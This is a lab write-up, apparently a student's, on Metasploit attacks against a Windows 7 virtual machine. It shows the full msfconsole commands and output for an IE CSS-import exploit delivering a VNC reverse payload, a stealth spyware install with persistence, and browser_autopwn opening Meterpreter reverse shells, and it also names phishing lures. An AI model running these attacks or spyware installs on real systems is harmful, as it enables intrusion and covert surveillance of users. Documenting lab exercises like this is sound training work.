# Metasploit Payloads – VNC Inject, Browser Autopwn & Post-Exploitation Spyware

## Overview

This lab explores advanced Metasploit payload techniques beyond a basic Meterpreter shell. Three attack scenarios are covered: a VNC inject payload that delivers a remote desktop view of the victim machine via a browser-based exploit, post-exploitation spyware installation for persistent user activity monitoring, and a browser_autopwn module that concurrently serves 20 browser exploits to fingerprint and compromise multiple session types. Together, these techniques mirror real-world adversary behavior during the initial access, persistence, and collection phases of an intrusion.


---

## Environment

| Component | Details |
|---|---|
| Attacker OS | Kali Linux (kali / kali) |
| Target OS | Windows 7 Professional SP1 x64 (student / AB12cd34) |
| Network | VirtualBox NAT Network — MultimachineNAT (10.0.5.0/24) |
| Attacker IP | 10.0.5.7 |
| Target IP | 10.0.5.8 |
| Framework | Metasploit Framework 6 (msfconsole) |
| Exploit 1 | `exploit/windows/browser/ms11_003_ie_css_import` |
| Payload 1 | `windows/vncinject/reverse_tcp` |
| Exploit 2 | `auxiliary/server/browser_autopwn` |
| Spyware Tool | SpyTech Spy Agent (trial) |
| Listener Port | TCP 443 (VNC), 3333 / 6666 / 7777 (autopwn handlers) |

---

## Walkthrough

### Part 1 — VNC Inject via IE CSS Import Exploit

#### 1a. Module Setup

The `ms11_003_ie_css_import` exploit targets a use-after-free vulnerability in Internet Explorer's CSS parser (CVE-2011-0035). It hosts a malicious HTML page; when the victim browses to it, the exploit fires and delivers the payload.

```
msf6 > use exploit/windows/browser/ms11_003_ie_css_import
msf6 exploit(windows/browser/ms11_003_ie_css_import) > set payload windows/vncinject/reverse_tcp
msf6 exploit(windows/browser/ms11_003_ie_css_import) > set LHOST 10.0.5.7
msf6 exploit(windows/browser/ms11_003_ie_css_import) > set LPORT 443
msf6 exploit(windows/browser/ms11_003_ie_css_import) > set VIEWONLY false
msf6 exploit(windows/browser/ms11_003_ie_css_import) > exploit
```

The `reverse_tcp` designation means the victim machine initiates the outbound connection back to the attacker — not the other way around. This bypasses most inbound firewall rules, which typically block unsolicited inbound connections but permit outbound traffic.

#### 1b. Exploit Execution and Stage Delivery

```
[*] Started reverse TCP handler on 10.0.5.7:443
[*] Using URL: http://10.0.5.7:8080/7cKIIQQUQIpzH
[*] Server started.
[*] 10.0.5.8   ms11_003_ie_css_import - Received request for "/7cKIIQQUQIpzH"
[*] 10.0.5.8   ms11_003_ie_css_import - Sending HTML
[*] 10.0.5.8   ms11_003_ie_css_import - Sending .NET DLL
[*] 10.0.5.8   ms11_003_ie_css_import - Sending CSS
[*] Sending stage (401920 bytes) to 10.0.5.8
[*] Starting local TCP relay on 127.0.0.1:5900 ...
[*] Local TCP relay started.
[*] Launched vncviewer.
Connected to RFB server, using protocol version 3.8
Authentication successful
Desktop name "admin-pc"
[*] VNC Server session 1 opened (10.0.5.7:443 → 10.0.5.8:49412) at 2025-02-14 21:55:35 -0500
```

When the victim visits `http://10.0.5.7:8080/7cKIIQQUQIpzH` in Internet Explorer, the exploit fires and sends a 401,920-byte VNC server stage to the target. A TightVNC viewer window opens on the attacker machine displaying a live view of the Windows 7 desktop including the open browser.

**Note:** In this lab environment, the `VIEWONLY false` setting did not fully take effect — the VNC session remained read-only due to a known issue with this module version. In a real engagement, interactive control (launching programs, typing credentials, etc.) would be possible.

#### 1c. Social Engineering Vector

To deliver this exploit in the wild, an attacker would need to lure a victim to the malicious URL. Viable methods include phishing emails with hyperlinks disguised behind anchor text, URL shorteners, or typosquatted domains that masquerade as legitimate resources.

---

### Part 2 — Post-Exploitation Spyware Deployment

With VNC access established, an attacker could silently install monitoring software on the victim machine. SpyTech Spy Agent was deployed in stealth mode to demonstrate this capability:

- Configured for stealth (hidden from taskbar, no visible window)
- Set to load on Windows startup (persistence)
- Monitored website visits, browser history, and internet activity across both Firefox and Internet Explorer

After visiting several websites (YouTube, Gmail, Google, iCloud, Wikipedia, Reddit, Google Drive), SpyAgent logged 11 browsing sessions with timestamps, usernames, page titles, and URLs under the "student" account. Network connection logging showed no entries, which is consistent with the NAT network configuration in the lab environment.

**Defensive relevance:** This demonstrates why endpoint detection tools need behavioral heuristics, not just signature scanning — SpyAgent passed Windows Defender because it is commercial software. A SOC analyst investigating anomalous persistence (e.g., unexpected startup entries, hidden processes, or unusual outbound connections) would need to correlate process trees and registry run keys.

---

### Part 3 — Browser Autopwn (Multi-Browser Exploitation)

#### 3a. Module Configuration

`browser_autopwn` is an auxiliary module that spins up a server hosting 20 simultaneous browser exploits, each at a unique URL. When a victim visits the root URL, JavaScript fingerprints the browser and redirects to the most likely exploit path.

```
msf6 > use auxiliary/server/browser_autopwn
msf6 auxiliary(server/browser_autopwn) > set LHOST 10.0.5.7
msf6 auxiliary(server/browser_autopwn) > set SRVPORT 80
msf6 auxiliary(server/browser_autopwn) > set URIPATH /
msf6 auxiliary(server/browser_autopwn) > run
```

#### 3b. Exploit Modules Loaded

The module staged 20 exploit servers including:

```
[*] Starting exploit multi/browser/opera_configoverwrite          → generic/shell_reverse_tcp
[*] Starting exploit windows/browser/adobe_flash_mp4_cprt        → windows/meterpreter/reverse_tcp
[*] Starting exploit windows/browser/adobe_flash_rtmp            → windows/meterpreter/reverse_tcp
[*] Starting exploit windows/browser/ie_cgenericelement_uaf      → windows/meterpreter/reverse_tcp
[*] Starting exploit windows/browser/ie_createobject             → windows/meterpreter/reverse_tcp
[*] Starting exploit windows/browser/ie_execcommand_uaf          → windows/meterpreter/reverse_tcp
[*] Starting exploit windows/browser/mozilla_nstreerange         → windows/meterpreter/reverse_tcp
[*] Starting exploit windows/browser/ms13_080_cdisplaypointer    → windows/meterpreter/reverse_tcp
[*] Starting exploit windows/browser/ms13_090_cardspacesigninhelper → windows/meterpreter/reverse_tcp
...
[*] --- Done, found 20 exploit modules
[*] Using URL: http://10.0.5.7/
[*] Server started.
```

Handlers were started on ports 3333 (Windows Meterpreter), 6666 (generic shell), and 7777 (Java Meterpreter).

#### 3c. Internet Explorer Exploitation Result

When the Windows 7 VM visited `http://10.0.5.7/` in Internet Explorer, the browser crashed with "Internet Explorer has closed this webpage to help protect your computer." Back on Kali, six simultaneous Meterpreter sessions were opened:

```
sessions -l

Active sessions
===============

  Id  Type                     Information       Connection
  1   meterpreter java/windows  student@admin-PC  10.0.5.7:7777 → 10.0.5.8:49377
  2   meterpreter java/windows  student@admin-PC  10.0.5.7:7777 → 10.0.5.8:49378
  3   meterpreter java/windows  student@admin-PC  10.0.5.7:7777 → 10.0.5.8:49379
  4   meterpreter java/windows  student@admin-PC  10.0.5.7:7777 → 10.0.5.8:49404
  5   meterpreter java/windows  student@admin-PC  10.0.5.7:7777 → 10.0.5.8:49415
  6   meterpreter java/windows  student@admin-PC  10.0.5.7:7777 → 10.0.5.8:49418
```

All sessions were Java/Windows Meterpreter, exploiting the outdated Java 5 plugin installed in Internet Explorer.

#### 3d. Firefox Result — No Sessions

When the same URL was visited in Firefox, no new sessions were created. The `browser_autopwn` exploits in this module target older browser-specific vulnerabilities and Java plugins; Firefox did not have the vulnerable Java plugin configured, and none of the loaded modules matched its version or plugin profile. This demonstrates that exploit success is browser- and plugin-version-dependent — a key reason defenders prioritize browser and plugin patching.

---

## Skills Demonstrated

- Browser-based exploit delivery via `ms11_003_ie_css_import` (CVE-2011-0035)
- VNC payload injection for remote desktop visibility
- Understanding of reverse TCP vs. bind TCP payload mechanics
- Post-exploitation spyware deployment and stealth configuration
- Multi-browser exploitation with `browser_autopwn` (20 concurrent exploits)
- Java Meterpreter session establishment via outdated browser plugin
- Social engineering delivery vectors for malicious URLs
- Comparative browser exploit surface analysis (IE vs. Firefox)

---

## References

- [CVE-2011-0035 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-0035)
- [Metasploit browser_autopwn Documentation](https://www.offensive-security.com/metasploit-unleashed/browser-autopwn/)
- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- MITRE ATT&CK: [T1189 – Drive-by Compromise](https://attack.mitre.org/techniques/T1189/), [T1071 – Application Layer Protocol](https://attack.mitre.org/techniques/T1071/), [T1056.001 – Keylogging](https://attack.mitre.org/techniques/T1056/001/), [T1547 – Boot or Logon Autostart](https://attack.mitre.org/techniques/T1547/)
